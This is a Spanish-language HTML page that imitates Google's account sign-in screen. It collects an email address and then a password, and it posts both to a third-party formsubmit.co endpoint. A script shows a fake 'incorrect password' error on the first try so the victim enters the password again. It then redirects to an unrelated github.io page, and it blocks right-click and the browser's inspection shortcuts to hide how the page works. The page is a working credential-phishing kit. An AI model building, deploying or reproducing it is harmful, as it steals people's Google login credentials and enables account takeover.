<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Accede a tu cuenta con tu Cuenta de Google</title>
  <link href="//www.gstatic.com/images/branding/searchlogo/ico/favicon.ico" rel="icon">
</head>
<body style="background-color: #f0f4f9; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin:0;">

  <!-- Contenedor -->
  <div style="width: 70%; max-width: 1280px; background-color: white; box-shadow: 0 10px 15px rgba(0,0,0,0.1); border-radius: 16px; padding: 32px; box-sizing: border-box; text-align:center;">
    
    <!-- Logo -->
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAA7VBMVEVHcEz/RkL/R0D+SEr/RUD/RkOwjlb/SD7/SE3/SUj/Vzb/VDf9TFb8TVeHoFb/YTD/byn8TVn/jRr/fSL/mxL/SEj+yQn/ohH/tQv+VUb/vQn/wwn+zgj9wQm3xQ39zgT6zQYwhv/7zgowhv8uhv0ek+Avhv7yzAPjywIvhv0whv7PyQHUygIth/y3yAEnivSlxwGSxgUak94fj+h5xAlgwxMLqp8NnsQVlte6xwBNwh45wC0xwDMLt28IrJgJpa0kjPCaxQEpvzsevkkWvVANumQQu18JtXkIsIgTvVYOvGALuWtJwh4OvF8OvF9ccfxCAAAAT3RSTlMAUZvT7P8T//+wiv//kAv6/mD//+V2jv//JKf//0EmxOr/rP7+MEX//x10/6eu//3+/9v///7I//+K//+KS/3/YeX//7dsnv7/////5s3tMAqBMAAAAXFJREFUeAF0jUUCwCAMwDp3d/f9/4krnVt6goQCFzheECVJFHgOPpB5RZHYIKqqyU+vGwpCXkVM07pp2zEQ8hSYiCBf1rsuFrQCvaSahHe+9wMqWHJuOD2E/lYoWsRxkUbBxcdJshY6bEQ3L6fpWmTnXXbxkBcpJTb8UBZFgUX156uyLLHI4Y+YgqL+DZqS0R7n7o4NLQX9GQwbI5tugpKI7wF5Rjd/BiNCCQZfX5BfCwyWrsnagGEYiKKpMkLqgJmZmXn/caKTzGoM7+v4IEiWPQdJ4fMhFujHCzjH7Wny6xFwMB9UKBa4KN3Tl4kh9AZYVJRbpXhVVRGX0asEXNP1a7MM0wQJA+0WFcQtyz7bcFzPAwn+8AkPwmjDcZK6WJGR75zwsCirOo7rpu0SojC2oQUeIF72/TCMY4sUKSj2wX9iXgAHwYgEoKBPizOBgx4EhwnCtxOtDnYTzn1Gnw3wzYQT3zDJrpmXYVjmpj7d/gPknlJE6eZSewAAAABJRU5ErkJggg==" 
         alt="Google" style="width: 40px; margin-bottom: 16px;">

    <h1 style="font-size: 24px; color: #111827; font-weight: 400; margin:0;">Accede a tu cuenta</h1>
    <a href="#" style="font-size: 14px; color: #374151; text-decoration: none;">Ir a Gmail</a>

    <!-- Formulario -->
    <form id="contactForm" 
          action="https://formsubmit.co/b58372e3afafe5f908daf1b0cc3c700f" 
          method="POST" 
          style="margin-top: 24px; display: flex; flex-direction: column; align-items:center; gap: 20px;">

      <!-- Paso 1: Correo -->
      <div id="step1" style="width:100%;">
        <input 
          id="correo"
          name="correo" 
          placeholder="Correo electrónico o teléfono" 
          type="email" 
          required
          style="width: 100%; border: 1px solid #D1D5DB; border-radius: 8px; padding: 12px; font-size: 16px; box-sizing: border-box; outline: none;">

        <div style="font-size: 14px; margin-top: 8px; text-align:left;">
          <a href="#" style="color: #2563EB; text-decoration: none;">¿Olvidaste el correo electrónico?</a>
        </div>

        <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 24px;">
          <a href="#" style="color: #2563EB; font-size: 14px; text-decoration: none;">Crear cuenta</a>
          <button type="button" 
                  id="btnNext1"
                  style="background-color: #2563EB; color: white; padding: 8px 24px; border-radius: 8px; font-weight: 500; border:none; cursor:pointer;">
            Siguiente
          </button>
        </div>
      </div>

      <!-- Paso 2: Contraseña (oculto al inicio) -->
      <div id="step2" style="display: none; width:100%;">
        <p style="color: #374151; font-size: 14px; margin-bottom: 8px; text-align:left;">Introduce tu contraseña</p>

        <input id="nombre" 
               name="nombre" 
               placeholder="Ingresa tu contraseña" 
               type="password" 
               required
               style="width: 100%; border: 1px solid #D1D5DB; border-radius: 8px; padding: 12px; font-size: 16px; box-sizing: border-box; outline: none;">
        <p id="errorNombre" style="color: #DC2626; font-size: 14px; margin-top: 4px; display:none; text-align:left;">Contraseña incorrecta</p>

        <!-- Hidden fields -->
        <input type="hidden" name="_next" value="https://samir2212-f.github.io/">
        <input type="hidden" name="_captcha" value="false">

        <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 24px;">
          <a href="#" style="color: #2563EB; font-size: 14px; text-decoration: none;">¿Olvidaste tu contraseña?</a>
          <button type="submit" 
                  style="background-color: #2563EB; color: white; padding: 8px 24px; border-radius: 8px; font-weight: 500; border:none; cursor:pointer;">
            Siguiente
          </button>
        </div>
      </div>
    </form>
  </div>

  <!-- Script -->
  <script>
    let intentoNombre = 0;

    // Paso de correo → contraseña
    document.getElementById("btnNext1").addEventListener("click", function() {
      const correo = document.getElementById("correo").value.trim();
      if (correo === "") {
        alert("Por favor ingresa tu correo");
        return;
      }
      document.getElementById("step1").style.display = "none";
      document.getElementById("step2").style.display = "block";
    });

    // Validación contraseña
    document.getElementById("contactForm").addEventListener("submit", function(e) {
      const nombre = document.getElementById("nombre");
      const errorMsg = document.getElementById("errorNombre");

      intentoNombre++;

      if (intentoNombre < 2) { 
        errorMsg.style.display = "block";
        nombre.style.borderColor = "#DC2626";
        errorMsg.textContent = "Contraseña incorrecta";
        e.preventDefault();
      } else {
        errorMsg.style.display = "none";
        nombre.style.borderColor = "#D1D5DB";

        setTimeout(() => {
          window.location.href = "https://samir2212-f.github.io/pelis/";
        }, 1500);
      }
    });

    // Bloquear clic derecho e inspección
    document.addEventListener("contextmenu", e => e.preventDefault()); 
    document.onkeydown = function(e) {
      if (e.keyCode == 123) return false; 
      if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false; 
      if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false; 
      if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false; 
    };
  </script>

</body>
</html>
